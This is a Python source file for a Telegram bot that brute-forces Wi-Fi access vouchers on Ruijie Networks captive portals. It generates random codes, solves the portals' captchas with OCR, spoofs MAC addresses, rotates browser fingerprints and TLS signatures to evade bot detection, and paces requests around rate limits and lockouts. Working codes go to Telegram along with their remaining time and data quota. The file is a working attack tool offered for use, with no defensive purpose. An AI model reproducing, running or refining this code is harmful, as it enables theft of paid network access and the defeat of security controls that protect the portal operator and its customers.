import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid, logging, signal, threading
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp import web
import cv2
import ddddocr
import numpy as np
from typing import Optional, Dict, List, Any

# ── curl_cffi (TLS fingerprint evasion) ──────────────────────────────────
try:
    from curl_cffi.requests import AsyncSession as CurlAsyncSession
    CURL_CFFI_AVAILABLE = True
except ImportError:
    CURL_CFFI_AVAILABLE = False
    print("⚠️ curl_cffi not available. Install with: pip install curl_cffi")

# ── Logging ───────────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s'
)
logger = logging.getLogger(__name__)

# ── Environment variables ─────────────────────────────────────────────────
BOT_TOKEN = os.environ.get('BOT_TOKEN')
GITHUB_TOKEN = os.environ.get('GITHUB_TOKEN')
ADMIN_ID = os.environ.get('ADMIN_ID')
REPO_OWNER = os.environ.get('REPO_OWNER')
REPO_NAME = os.environ.get('REPO_NAME')

if not BOT_TOKEN:
    raise SystemExit("❌ BOT_TOKEN environment variable not set")

# ── Global structures ─────────────────────────────────────────────────────
SUCCESS_CODE = asyncio.Queue()
bot = AsyncTeleBot(BOT_TOKEN)

user_data: Dict[int, Dict[str, str]] = {}
scan_tasks: Dict[int, Dict[str, Any]] = {}
success_texts: Dict[int, List[Dict[str, Any]]] = {}
limited_texts: Dict[int, List[str]] = {}
captcha_state: Dict[str, Dict[str, Any]] = {}

notify_setting: Dict[int, bool] = {}
DEFAULT_NOTIFY = True
last_scan_params: Dict[int, Dict[str, Any]] = {}
pending_brute: Dict[int, Dict[str, Any]] = {}
success_messages: Dict[int, int] = {}
limited_messages: Dict[int, int] = {}

session: Optional[aiohttp.ClientSession] = None
_connector: Optional[aiohttp.TCPConnector] = None

# ── Tuning parameters (GitHub insights) ───────────────────────────────────
CONCURRENCY = 12                # Ruijie API limit ~20 req/s → keep safe
BATCH_SIZE = 50                 # Smaller batch → more responsive
SUBMIT_INTERVAL = 0.06          # ~16 QPS base
CAPTCHA_RETRY = 5
MAX_ATTEMPTS = 2
PROGRESS_INTERVAL = 3
GITHUB_INTERVAL = 30
CAPTCHA_CACHE_TTL = 240         # 4 min (Ruijie session ~5 min)

REQUEST_JITTER = 0.02
TLS_IMPERSONATE_TARGET = "chrome120"

# ── Ruijie 2026 security policy (Redlnn insight) ─────────────────────────
MAX_CONSECUTIVE_ERRORS = 20     # Redlnn: 3-5 min ban after many wrong attempts
ERROR_COOLDOWN_SECONDS = 300    # 5 min cooldown

_voucher_sem: Optional[asyncio.Semaphore] = None
_start_time = time.monotonic()

# ── Portal Configuration ──────────────────────────────────────────────────
PORTAL_CONFIGS = {
    "portal-mm-as": {
        "domain": "portal-mm-as.ruijienetworks.com",
        "base_url": "https://portal-mm-as.ruijienetworks.com",
        "voucher_api": base64.b64decode(
            b'aHR0cHM6Ly9wb3J0YWwtbW0tYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
        ).decode(),
        "balance_api": "https://portal-mm-as.ruijienetworks.com/api/auth/balance/getBalance",
        "captcha_image_api": "https://portal-mm-as.ruijienetworks.com/api/auth/captcha/image",
        "captcha_verify_api": "https://portal-mm-as.ruijienetworks.com/api/auth/captcha/verify",
        "referer_index": "https://portal-mm-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=",
        "referer_balance": "https://portal-mm-as.ruijienetworks.com/download/static/maccauth/src/balance.html?RES=./../expand/res/4ukmferxbdgmt3m49po&sessionId={token}&lang=en_US&redirectUrl=https://www.ruijienetwoacom&authTypeype=15",
    },
    "portal-as": {
        "domain": "portal-as.ruijienetworks.com",
        "base_url": "https://portal-as.ruijienetworks.com",
        "voucher_api": base64.b64decode(
            b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
        ).decode(),
        "balance_api": "https://portal-as.ruijienetworks.com/api/auth/balance/getBalance",
        "captcha_image_api": "https://portal-as.ruijienetworks.com/api/auth/captcha/image",
        "captcha_verify_api": "https://portal-as.ruijienetworks.com/api/auth/captcha/verify",
        "referer_index": "https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=",
        "referer_balance": "https://portal-as.ruijienetworks.com/download/static/maccauth/src/balance.html?RES=./../expand/res/4ukmferxbdgmt3m49po&sessionId={token}&lang=en_US&redirectUrl=https://www.ruijienetwoacom&authTypeype=15",
    }
}

DEFAULT_PORTAL = "portal-mm-as"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
]


# ══════════════════════════════════════════════════════════════════════════
#  Helper functions
# ══════════════════════════════════════════════════════════════════════════

def get_portal_config(session_url: Optional[str] = None):
    if session_url:
        if "portal-mm-as" in session_url:
            return PORTAL_CONFIGS["portal-mm-as"], "portal-mm-as"
        elif "portal-as" in session_url:
            return PORTAL_CONFIGS["portal-as"], "portal-as"
    return PORTAL_CONFIGS[DEFAULT_PORTAL], DEFAULT_PORTAL


def get_random_user_agent() -> str:
    return random.choice(USER_AGENTS)


def build_session_headers(portal_config: dict, session_id: str, user_agent: str) -> dict:
    chrome_ver = re.search(r'Chrome/(\d+)', user_agent)
    ver = chrome_ver.group(1) if chrome_ver else "120"
    platform = ('"Windows"' if 'Windows' in user_agent
                else '"macOS"' if 'Macintosh' in user_agent
                else '"Linux"')
    return {
        'authority': portal_config['domain'],
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json',
        'origin': portal_config['base_url'],
        'referer': portal_config['referer_index'] + session_id,
        'sec-ch-ua': f'"Chromium";v="{ver}", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': platform,
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': user_agent,
        'x-requested-with': 'XMLHttpRequest',
    }


def build_balance_headers(portal_config: dict, token: str, user_agent: str) -> dict:
    chrome_ver = re.search(r'Chrome/(\d+)', user_agent)
    ver = chrome_ver.group(1) if chrome_ver else "120"
    platform = ('"Windows"' if 'Windows' in user_agent
                else '"macOS"' if 'Macintosh' in user_agent
                else '"Linux"')
    return {
        'authority': portal_config['domain'],
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json;',
        'referer': portal_config['referer_balance'].format(token=token),
        'sec-ch-ua': f'"Chromium";v="{ver}", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': platform,
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': user_agent,
        'x-requested-with': 'XMLHttpRequest',
    }


# ── Plan / time formatting ────────────────────────────────────────────────
def plan_to_minutes(s):
    if not s:
        return 0
    s = s.strip().lower()
    if s in ('unlimit', 'unlimited'):
        return float('inf')
    total = 0
    for val, unit in re.findall(r'(\d+)\s*(mo|min|h|d|m)\b', s):
        val = int(val)
        if unit == 'mo':
            total += val * 30 * 24 * 60
        elif unit == 'd':
            total += val * 24 * 60
        elif unit == 'h':
            total += val * 60
        elif unit in ('min', 'm'):
            total += val
    return total


def _parse_seconds(val):
    secs = int(val)
    hours = secs // 3600
    mins = (secs % 3600) // 60
    if hours > 0:
        return f"{hours}h {mins}m"
    elif mins > 0:
        return f"{mins}m"
    return f"{secs}s"


def _parse_minutes(val):
    total_mins = int(val)
    if total_mins <= 0:
        return "0m"
    if total_mins < 60:
        return f"{total_mins}m"
    hours = total_mins // 60
    mins = total_mins % 60
    if hours < 24:
        return f"{hours}h {mins}m" if mins else f"{hours}h"
    days = hours // 24
    rem_hours = hours % 24
    if days < 30:
        return f"{days}d {rem_hours}h" if rem_hours else f"{days}d"
    months = days // 30
    rem_days = days % 30
    return f"{months}mo {rem_days}d" if rem_days else f"{months}mo"


def _format_bytes(bytes_val):
    try:
        bytes_val = float(bytes_val)
        if bytes_val >= 1024**3:
            return f"{bytes_val/(1024**3):.3f} GB"
        elif bytes_val >= 1024**2:
            return f"{bytes_val/(1024**2):.3f} MB"
        elif bytes_val >= 1024:
            return f"{bytes_val/1024:.3f} KB"
        return f"{bytes_val:.0f} B"
    except:
        return "N/A"


def _format_quota(used, total=None):
    try:
        if isinstance(used, dict):
            up = used.get('up', used.get('upload', 0))
            down = used.get('down', used.get('download', 0))
            total_used = used.get('total', up + down)
        else:
            total_used = used
            up = down = 0
        used_str = _format_bytes(total_used)
        if up and down:
            return f"{used_str}({_format_bytes(up)}↑ / {_format_bytes(down)}↓)"
        return used_str
    except:
        return "N/A"


def _empty_balance():
    return {"time": "N/A", "usage": "N/A", "quota": "N/A", "plan": "N/A", "expire": "N/A"}


def _process_balance_data(data):
    result = _empty_balance()
    candidates = [data]
    for nested_key in ['result', 'data']:
        if isinstance(data, dict) and isinstance(data.get(nested_key), dict):
            candidates.append(data[nested_key])

    for d in candidates:
        if not isinstance(d, dict):
            continue
        for key in ['totalMinutes', 'remainingMinutes', 'remainMinutes',
                    'leftMinutes', 'balance', 'remaining']:
            val = d.get(key)
            if val is not None:
                result["time"] = _parse_minutes(val)
                break
        for key in ['remainingSeconds', 'remainTime', 'remainingTime',
                    'leftTime', 'timeLeft', 'remain_time']:
            val = d.get(key)
            if val is not None:
                result["time"] = _parse_seconds(val)
                break

        usage = d.get('usage') or d.get('dataUsage') or d.get('traffic')
        if usage:
            result["usage"] = _format_quota(usage) if isinstance(usage, dict) else _format_bytes(usage)

        quota = d.get('quota') or d.get('dataQuota') or d.get('limit')
        session_quota = d.get('sessionQuota')
        total_quota = d.get('totalQuota')
        if session_quota and total_quota:
            result["quota"] = f"{_format_bytes(session_quota)} / {_format_bytes(total_quota)}"
        elif quota:
            result["quota"] = _format_bytes(quota)

        plan = d.get('plan') or d.get('planName') or d.get('internetPlan') or d.get('package')
        if plan:
            result["plan"] = str(plan)

        expire = d.get('expireTime') or d.get('expiration') or d.get('expire') or d.get('validUntil')
        if expire:
            result["expire"] = str(expire)

    return result


async def get_balance(token, portal_config, user_agent=None):
    url = f"{portal_config['balance_api']}/{token}"
    ua = user_agent or get_random_user_agent()
    headers = build_balance_headers(portal_config, token, ua)

    if CURL_CFFI_AVAILABLE:
        try:
            async with CurlAsyncSession(impersonate=TLS_IMPERSONATE_TARGET) as cs:
                resp = await cs.get(url, headers=headers, timeout=10)
                if resp.status_code == 200:
                    return _process_balance_data(resp.json())
                logger.debug(f"[get_balance] curl_cffi status={resp.status_code}, fallback")
        except Exception as e:
            logger.warning(f"[get_balance] curl_cffi failed: {e}, using aiohttp")

    cookies = {'sensorsdata2015jssdkcross': '%7B%22distinct_id%22%3A%2219e460ef444507-091ef90c028745-1e462c6e-343089-19e460ef4452ab%22%7D'}
    try:
        async with session.get(url, headers=headers, cookies=cookies,
                               timeout=aiohttp.ClientTimeout(total=8)) as resp:
            raw = await resp.text()
            if resp.status != 200:
                alt_url = f"{portal_config['base_url']}/api/macc2/balance/getBalance/{token}"
                async with session.get(alt_url, headers=headers, cookies=cookies,
                                       timeout=aiohttp.ClientTimeout(total=8)) as alt_resp:
                    raw = await alt_resp.text()
                    if alt_resp.status != 200:
                        return _empty_balance()
            return _process_balance_data(json.loads(raw))
    except Exception as e:
        logger.error(f"[get_balance] error for {token}: {e}")
        return _empty_balance()


def iter_codes(mode, length):
    if mode == 1:
        chars = string.digits
    elif mode == 2:
        chars = string.ascii_lowercase
    elif mode == 3:
        chars = string.ascii_uppercase
    elif mode == 4:
        chars = string.ascii_letters
    elif mode == 5:
        chars = string.ascii_lowercase + string.digits
    else:
        raise ValueError(f"Invalid mode: {mode}. Use 1-5")
    while True:
        yield "".join(random.choice(chars) for _ in range(length))


def format_progress(checked, total=None, speed=0, found=0, target=None, retry=0, cooldown=0):
    lines = [
        "📋 Status: Running" if not cooldown else f"🧊 Cooling down: {cooldown}s",
        f"⚡ Speed: {speed:,.0f}/min",
        f"🔍 Checked: {checked:,}",
        f"💎 Found: {found}",
    ]
    if retry:
        lines.append(f"🔄 Retry Queue: {retry}")
    if target:
        lines.append(f"🎯 Target: {found}/{target}")
    return "\n".join(lines)


# ══════════════════════════════════════════════════════════════════════════
#  Web server (keep-alive)
# ══════════════════════════════════════════════════════════════════════════
async def handle(request):
    return web.Response(text="Bot is awake and running 24/7!")


async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('BOT_PORT', 8099))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    logger.info(f"Web server started on port {port}")


# ══════════════════════════════════════════════════════════════════════════
#  GitHub helpers
# ══════════════════════════════════════════════════════════════════════════
async def get_file_content(path):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    try:
        async with session.get(url, headers=headers) as response:
            if response.status == 200:
                data = await response.json()
                content = base64.b64decode(data['content']).decode('utf-8')
                return json.loads(content), data['sha']
            elif response.status == 404:
                return {}, None
    except Exception as e:
        logger.error(f"[get_file_content] error: {e}")
    return {}, None


async def update_file_content(path, content, sha, message):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Content-Type": "application/json"
    }
    encoded = base64.b64encode(json.dumps(content).encode()).decode()
    payload = {"message": message, "content": encoded}
    if sha:
        payload["sha"] = sha
    async with session.put(url, headers=headers, json=payload) as response:
        return await response.text()


# ══════════════════════════════════════════════════════════════════════════
#  Captcha handling (thread-safe)
# ══════════════════════════════════════════════════════════════════════════
_ocr_local = threading.local()


def _get_ocr():
    if not hasattr(_ocr_local, 'ocr'):
        _ocr_local.ocr = ddddocr.DdddOcr(show_ad=False)
    return _ocr_local.ocr


def _ocr_sync(image_bytes):
    try:
        ocr = _get_ocr()
        nparr = np.frombuffer(image_bytes, np.uint8)
        img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
        if img is None:
            return None
        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
        _, thresh = cv2.threshold(gray, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
        _, buffer = cv2.imencode('.png', thresh)
        result = ocr.classification(buffer.tobytes())
        return result.upper()
    except Exception as e:
        logger.error(f"[_ocr_sync] error: {e}")
        return None


async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)


def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)


def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)


async def get_session_id(session_obj, session_url, user_agent, previous_session_id=None):
    mac = get_mac()
    url = replace_mac(session_url, new_mac=mac)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
        'referer': url,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': user_agent,
    }
    try:
        await asyncio.sleep(random.uniform(0.1, 0.3))
        async with session_obj.get(url, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            return sid.group(1) if sid else previous_session_id
    except Exception as e:
        logger.error(f"[get_session_id] error: {e}")
        return previous_session_id


async def Captcha_Image(session_obj, session_id, portal_config, user_agent):
    headers = {
        'authority': portal_config['domain'],
        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'referer': portal_config['referer_index'] + session_id,
        'sec-fetch-dest': 'image',
        'sec-fetch-mode': 'no-cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': user_agent,
    }
    params = {'sessionId': session_id, '_t': str(time.time())}
    await asyncio.sleep(random.uniform(0, REQUEST_JITTER))
    async with session_obj.get(portal_config['captcha_image_api'], params=params, headers=headers) as req:
        return await req.read()


async def Varify_Captcha(session_obj, session_id, text, portal_config, user_agent):
    headers = build_session_headers(portal_config, session_id, user_agent)
    json_data = {'sessionId': session_id, 'authCode': text}
    await asyncio.sleep(random.uniform(0, REQUEST_JITTER))
    async with session_obj.post(portal_config['captcha_verify_api'],
                                 headers=headers, json=json_data) as req:
        try:
            data = await req.json()
        except Exception:
            return None
        success = data.get("success")
        if success is True or success == 1 or str(success).lower() == "true":
            return session_id
        return None


async def check_session_url(session_url):
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
        'referer': session_url,
        'user-agent': get_random_user_agent(),
    }
    try:
        async with session.get(session_url, allow_redirects=True, headers=headers,
                               timeout=aiohttp.ClientTimeout(total=10)) as response:
            return "sessionId" in str(response.url)
    except:
        return False


# ══════════════════════════════════════════════════════════════════════════
#  Session + Captcha acquisition (reusable — GitHub insight)
# ══════════════════════════════════════════════════════════════════════════
async def _warmup_session(task_session, session_url, portal_config, session_id, user_agent):
    """Simulate real browser page load before brute force."""
    try:
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'referer': session_url,
            'user-agent': user_agent,
        }
        await task_session.get(session_url, headers=headers, allow_redirects=True)
        await asyncio.sleep(random.uniform(0.8, 1.8))

        captcha_headers = {
            'accept': 'image/avif,image/webp,*/*;q=0.8',
            'referer': portal_config['referer_index'] + session_id,
            'user-agent': user_agent,
        }
        await task_session.get(
            portal_config['captcha_image_api'],
            params={'sessionId': session_id, '_t': str(time.time())},
            headers=captcha_headers
        )
    except Exception as e:
        logger.debug(f"[warmup] error: {e}")


async def acquire_session_and_captcha(session_url: str, portal_config: dict) -> Optional[Dict[str, Any]]:
    """
    Returns dict {session, session_id, auth_code, ts, user_agent} or None.
    UA is fixed for the entire session (GitHub insight — avoid bot detection).
    """
    ua = get_random_user_agent()  # ⚡ Once per session

    for attempt in range(MAX_ATTEMPTS):
        try:
            task_session = aiohttp.ClientSession(
                connector=_connector,
                connector_owner=False,
                cookie_jar=aiohttp.CookieJar(),
                timeout=aiohttp.ClientTimeout(total=25)
            )
            session_id = await get_session_id(task_session, session_url, ua)
            if not session_id:
                await task_session.close()
                continue

            await _warmup_session(task_session, session_url, portal_config, session_id, ua)

            for _ in range(CAPTCHA_RETRY):
                try:
                    image = await Captcha_Image(task_session, session_id, portal_config, ua)
                    text = await Captcha_Text(image)
                    if not text:
                        continue
                    if await Varify_Captcha(task_session, session_id, text, portal_config, ua):
                        return {
                            "session": task_session,
                            "session_id": session_id,
                            "auth_code": text,
                            "ts": time.time(),
                            "user_agent": ua,
                        }
                except Exception as e:
                    logger.debug(f"[acquire] captcha retry error: {e}")
                    continue

            await task_session.close()
        except Exception as e:
            logger.error(f"[acquire_session_and_captcha] attempt {attempt+1}: {e}")

    return None


def _cache_get(cache_key: str) -> Optional[Dict[str, Any]]:
    cached = captcha_state.get(cache_key)
    if cached and (time.time() - cached.get("ts", 0)) < CAPTCHA_CACHE_TTL:
        return cached
    return None


def _cache_clear(cache_key: str):
    cached = captcha_state.pop(cache_key, None)
    if cached and cached.get("session"):
        try:
            asyncio.create_task(cached["session"].close())
        except:
            pass


# ══════════════════════════════════════════════════════════════════════════
#  Core voucher check
# ══════════════════════════════════════════════════════════════════════════
async def perform_check(
    session_url: str,
    code: str,
    chat_id: int,
    scan_id: Optional[str] = None,
    recheck: bool = False,
    message: Any = None,
    plan_filters: Optional[List[str]] = None,
    shared_session: Optional[aiohttp.ClientSession] = None,
    shared_session_id: Optional[str] = None,
    shared_auth_code: Optional[str] = None,
    shared_user_agent: Optional[str] = None,
) -> Optional[Dict[str, Any]]:
    """
    Returns:
      None                                → not found / skipped
      {"status": "success", "code": ...}
      {"status": "limited", "code": ...}
      {"status": "rate_limited_need_refresh", "code": ...}  ← Ruijie 2026 update
      {"status": "error", "code": ...}
    """
    if not recheck:
        current_task = scan_tasks.get(chat_id)
        if not current_task or current_task.get("scan_id") != scan_id:
            return None

    portal_config, portal_name = get_portal_config(session_url)
    post_url = portal_config['voucher_api']

    task_session = shared_session
    session_id = shared_session_id
    auth_code = shared_auth_code
    user_agent = shared_user_agent

    if not task_session or not session_id or not auth_code:
        acquired = await acquire_session_and_captcha(session_url, portal_config)
        if not acquired:
            return {"status": "error", "code": code}
        task_session = acquired["session"]
        session_id = acquired["session_id"]
        auth_code = acquired["auth_code"]
        user_agent = acquired["user_agent"]

    data = {
        "accessCode": code,
        "sessionId": session_id,
        "apiVersion": 1,
        "authCode": auth_code,
    }
    headers = build_session_headers(portal_config, session_id, user_agent or get_random_user_agent())
    await asyncio.sleep(random.uniform(0, REQUEST_JITTER))

    response = None
    try:
        async with task_session.post(post_url, json=data, headers=headers) as req:
            response = await req.text()
            logger.debug(f"[voucher] code={code} status={req.status} body={response[:200]}")
    except Exception as e:
        logger.error(f"[perform_check] network error for {code}: {e}")
        return {"status": "error", "code": code}

    if not response:
        return {"status": "error", "code": code}

    resp_lower = response.lower()

    # ── 🔴 Ruijie 2026 security policy: request limit → captcha MUST be re-solved ──
    if 'request limited' in resp_lower or 'too many' in resp_lower:
        return {"status": "rate_limited_need_refresh", "code": code}

    # Voucher already used / flow limit
    if 'STA' in response:
        if chat_id not in limited_texts:
            limited_texts[chat_id] = []
        limited_texts[chat_id].append(code)
        if notify_setting.get(chat_id, DEFAULT_NOTIFY) and message:
            limited_line = "\n".join(limited_texts[chat_id])
            try:
                if chat_id not in limited_messages:
                    sent = await bot.send_message(chat_id, f"⚠️ Limited Codes:\n{limited_line}")
                    limited_messages[chat_id] = sent.message_id
                else:
                    await bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=limited_messages[chat_id],
                        text=f"⚠️ Limited Codes:\n{limited_line}"
                    )
            except:
                pass
        return {"status": "limited", "code": code}

    # Success
    if 'logonUrl' in response:
        if recheck:
            return {"status": "success", "code": code}

        plan_str = usage_str = quota_str = expire_str = "N/A"
        try:
            res_data = json.loads(response)
            logon_url = res_data.get("result", {}).get("logonUrl", "") if isinstance(res_data, dict) else ""
            token_match = re.search(r'token=(.*?)&', logon_url)
            token = token_match.group(1) if token_match else None
            if not token:
                sid_match = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", logon_url)
                token = sid_match.group(1) if sid_match else session_id

            balance_info = await get_balance(token, portal_config, user_agent)
            if isinstance(balance_info, dict):
                plan_str = balance_info.get("time", "N/A")
                usage_str = balance_info.get("usage", "N/A")
                quota_str = balance_info.get("quota", "N/A")
                expire_str = balance_info.get("expire", "N/A")
        except Exception as e:
            logger.error(f"[balance] error: {e}")

        if plan_filters:
            code_mins = plan_to_minutes(plan_str)
            if not any(code_mins >= plan_to_minutes(f) for f in plan_filters):
                return None

        if chat_id not in success_texts:
            success_texts[chat_id] = []
        success_texts[chat_id].append({
            "code": code, "session_id": session_id, "plan": plan_str,
            "usage": usage_str, "quota": quota_str, "expire": expire_str,
            "portal": portal_name
        })

        await SUCCESS_CODE.put({
            "chat_id": chat_id, "code": code, "session_id": session_id,
            "plan": plan_str, "usage": usage_str, "quota": quota_str
        })

        if notify_setting.get(chat_id, DEFAULT_NOTIFY) and message:
            code_lines = []
            for item in success_texts[chat_id]:
                line = f"`{item['code']}` – ⏳ {item['plan']}"
                if item.get('usage') and item['usage'] != 'N/A':
                    line += f"\n   📊 {item['usage']}"
                if item.get('quota') and item['quota'] != 'N/A':
                    line += f" | 💾 {item['quota']}"
                if item.get('portal'):
                    line += f" | 🌐 {item['portal']}"
                code_lines.append(line)
            code_text = "\n".join(code_lines)
            try:
                if chat_id not in success_messages:
                    sent = await bot.send_message(chat_id, f"✅ Success Codes:\n{code_text}", parse_mode="Markdown")
                    success_messages[chat_id] = sent.message_id
                else:
                    await bot.edit_message_text(
                        chat_id=chat_id, message_id=success_messages[chat_id],
                        text=f"✅ Success Codes:\n{code_text}", parse_mode="Markdown"
                    )
            except:
                pass
        return {"status": "success", "code": code}

    return None


# ══════════════════════════════════════════════════════════════════════════
#  Brute-force runner (GitHub-optimized)
# ══════════════════════════════════════════════════════════════════════════
async def run_bruteforce(
    mode: int, length: int, chat_id: int, session_url: str, scan_id: str,
    target: Optional[int] = None, message: Any = None,
    progress_msg: Any = None, plan_filters: Optional[List[str]] = None,
):
    try:
        code_iter = iter_codes(mode, length)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return

    portal_config, _ = get_portal_config(session_url)

    checked = found = 0
    retry_queue: List[str] = []
    consecutive_errors = 0
    scan_start = time.monotonic()
    last_progress_update = 0

    global _voucher_sem
    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(CONCURRENCY)

    cache_key = f"{chat_id}_{scan_id}"

    try:
        while True:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id:
                return
            if current_task.get("stop"):
                last_scan_params[chat_id] = {
                    "mode": mode, "length": length, "target": target,
                    "plan_filters": plan_filters or []
                }
                return

            # ── Acquire / refresh shared session + captcha ───────────
            cached = _cache_get(cache_key)
            if cached and cached.get("session") and not cached["session"].closed:
                shared_session = cached["session"]
                shared_session_id = cached["session_id"]
                shared_auth_code = cached["auth_code"]
                shared_user_agent = cached.get("user_agent", get_random_user_agent())
            else:
                _cache_clear(cache_key)
                acquired = await acquire_session_and_captcha(session_url, portal_config)
                if not acquired:
                    logger.warning("[run_bruteforce] failed to acquire session, retrying in 3s")
                    await asyncio.sleep(3)
                    continue
                captcha_state[cache_key] = acquired
                shared_session = acquired["session"]
                shared_session_id = acquired["session_id"]
                shared_auth_code = acquired["auth_code"]
                shared_user_agent = acquired["user_agent"]

            # ── Build batch (retry queue first — GitHub resume insight) ─
            batch = retry_queue[:BATCH_SIZE]
            retry_queue = retry_queue[BATCH_SIZE:]
            while len(batch) < BATCH_SIZE:
                batch.append(next(code_iter))

            async def _check(code, index):
                await asyncio.sleep(max(0, index * SUBMIT_INTERVAL + random.uniform(-REQUEST_JITTER, REQUEST_JITTER)))
                async with _voucher_sem:
                    return await perform_check(
                        session_url, code, chat_id, scan_id, message=message,
                        plan_filters=plan_filters,
                        shared_session=shared_session,
                        shared_session_id=shared_session_id,
                        shared_auth_code=shared_auth_code,
                        shared_user_agent=shared_user_agent,
                    )

            # ── Submit in chunks of 15 (≈16 QPS) ─────────────────────
            all_results = []
            for chunk_start in range(0, len(batch), 15):
                chunk = batch[chunk_start:chunk_start + 15]
                chunk_results = await asyncio.gather(
                    *[_check(code, i) for i, code in enumerate(chunk)],
                    return_exceptions=True
                )
                all_results.extend(chunk_results)
                rl_in_chunk = sum(1 for r in chunk_results
                                  if isinstance(r, dict) and r.get("status") == "rate_limited_need_refresh")
                await asyncio.sleep(1.0 if rl_in_chunk > len(chunk) * 0.3 else 0.5)

            # ── Process results ───────────────────────────────────────
            rate_limited_count = 0
            need_refresh = False

            for res in all_results:
                if not isinstance(res, dict):
                    checked += 1
                    continue

                status = res.get("status")
                if status == "success":
                    found += 1
                    checked += 1
                    consecutive_errors = 0
                    if target and found >= target:
                        await progress_msg.edit_text("🎯 Target reached!")
                        last_scan_params.pop(chat_id, None)
                        return
                elif status == "limited":
                    checked += 1
                    consecutive_errors += 1
                elif status == "rate_limited_need_refresh":   # Ruijie 2026
                    retry_queue.append(res["code"])
                    rate_limited_count += 1
                    need_refresh = True
                    consecutive_errors += 1
                elif status == "error":
                    retry_queue.append(res["code"])
                    consecutive_errors += 1
                else:
                    checked += 1
                    consecutive_errors = 0

            # ── 🔴 Ruijie 2026 rule: captcha MUST be re-solved on request limit ──
            if need_refresh:
                logger.warning("[run_bruteforce] Rate limit detected — refreshing session & captcha")
                _cache_clear(cache_key)
                await asyncio.sleep(3)
            elif rate_limited_count > len(batch) * 0.3:
                logger.warning(f"[run_bruteforce] High rate limit ratio, refreshing")
                _cache_clear(cache_key)
                await asyncio.sleep(3)

            # ── 🔴 Redlnn insight: 3-5 min ban after many wrong attempts ──
            if consecutive_errors >= MAX_CONSECUTIVE_ERRORS:
                logger.warning(f"[run_bruteforce] {consecutive_errors} consecutive errors — "
                               f"cooling down {ERROR_COOLDOWN_SECONDS}s")
                _cache_clear(cache_key)
                cooldown_text = f"🧊 Cooldown {ERROR_COOLDOWN_SECONDS}s (Ruijie policy)"
                try:
                    await progress_msg.edit_text(cooldown_text)
                except:
                    pass
                await asyncio.sleep(ERROR_COOLDOWN_SECONDS)
                consecutive_errors = 0

